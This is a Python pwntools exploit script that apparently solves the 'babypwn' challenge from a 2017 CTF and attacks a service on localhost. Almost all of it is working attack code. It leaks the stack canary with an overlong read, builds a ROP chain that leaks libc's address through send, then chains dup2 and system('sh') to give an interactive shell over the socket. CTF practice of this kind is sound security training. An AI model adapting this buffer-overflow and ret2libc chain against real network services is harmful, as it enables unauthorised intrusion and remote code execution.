#!/usr/bin/env python
from pwn import *
context.arch = 'i386'

'''
Ref : https://bamboofox.github.io/write-ups/2017/02/11/CODEGATE-CTF-PREQUALS-2017-babypwn.html

ncat -vc ./babypwn -kl 127.0.0.1 4000
nc localhost 4000 -> it will trigger program execute
'''

r = remote('127.0.0.1', 8181)
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
e = ELF('./babypwn')

send_got = e.got['send']
system_plt = e.plt['system']
dup2_off = libc.symbols['dup2']
output = 0x80488b1
fd_addr = 0x804b1b8
pop2 = 0x08048b84
pop1 = 0x08048589
ret = 0x08048572 
menu = 0x8048a71

r.recvuntil(' > ')
r.sendline('1')
r.recvuntil(' : ')
r.send('a'*41)
r.recv(41)
canary = u32(r.recv(3).rjust(4,'\x00'))
print hex(canary)

rop = flat(
    'a'*40, canary, 'b'*12,    
    output, pop1, send_got,
    output, menu, fd_addr
)

r.recvuntil(' > ')
r.sendline('1')
r.recvuntil(' : ')
r.sendline(rop)


r.recvuntil(' > ')
r.sendline('3')

libc_base = u32(r.recv('4')) - libc.symbols['send']
print hex(libc_base)


sh_addr = libc_base + next(libc.search('sh\x00'))
dup2_addr = libc_base + dup2_off
print hex(dup2_addr)

#fd = int(r.recv(1), 16)
fd = u8(r.recv(1))


rop2 = flat(
    'a'*40, canary, 'b'*12,
    dup2_addr, pop2, fd, 0,
    dup2_addr, pop2, fd, 1,
    system_plt, 0xdeadbeef, sh_addr
)

r.recvuntil(' > ')
r.sendline('1')
r.recvuntil(' : ')
r.sendline(rop2)

r.interactive()
